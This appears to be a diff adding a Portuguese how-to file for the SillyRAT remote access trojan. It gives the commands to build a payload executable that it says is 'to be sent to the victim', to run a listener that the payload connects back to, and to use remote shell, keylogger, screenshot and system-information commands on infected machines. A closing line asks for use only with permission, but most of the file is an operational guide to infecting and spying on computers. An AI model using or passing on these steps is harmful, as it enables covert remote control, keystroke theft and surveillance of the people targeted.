@@ -1,0 +1,48 @@
+# Comandos para usar o SillyRAT
+
+## 1. Gerar o payload (arquivo para enviar à vítima)
+
+Abra o PowerShell na pasta do projeto e execute:
+
+python server.py generate -a [IP_DO_SERVIDOR] -p [PORTA] -o [CAMINHO_DO_PAYLOAD]
+
+Exemplo:
+python server.py generate -a 192.168.15.200 -p 4444 -o C:\Users\Desktop\Desktop\Rat_Pae\payload.exe
+
+O arquivo "payload.exe" será criado no local indicado. Este é o arquivo que deve ser enviado para a vítima.
+
+---
+
+## 2. Iniciar o servidor para receber conexões
+
+python server.py bind -a [IP_DO_SERVIDOR] -p [PORTA]
+
+Exemplo:
+python server.py bind -a 192.168.15.200 -p 4444
+
+O servidor ficará aguardando a conexão do payload.
+
+---
+
+## 3. Fluxo básico de uso
+
+1. Gere o payload com o comando acima.
+2. Envie o arquivo gerado (payload.exe) para a vítima.
+3. Execute o comando para iniciar o servidor.
+4. Quando a vítima executar o payload, ela aparecerá como cliente conectado.
+5. Use os comandos do servidor (help, sessions, connect, shell, keylogger, sysinfo, screenshot, etc) para interagir.
+
+---
+
+## Observações
+- O payload só funciona em computadores Windows ou Linux.
+- Não funciona em celulares (Android/iOS).
+- O servidor pode ser reiniciado sem precisar gerar um novo payload.
+- Para ver os comandos disponíveis, digite "help" na interface do servidor.
+- Mantenha o servidor aberto para receber conexões.
+
+---
+
+## Segurança
+- Use apenas em ambientes de teste e com permissão.
+- Não execute em máquinas de terceiros sem autorização.
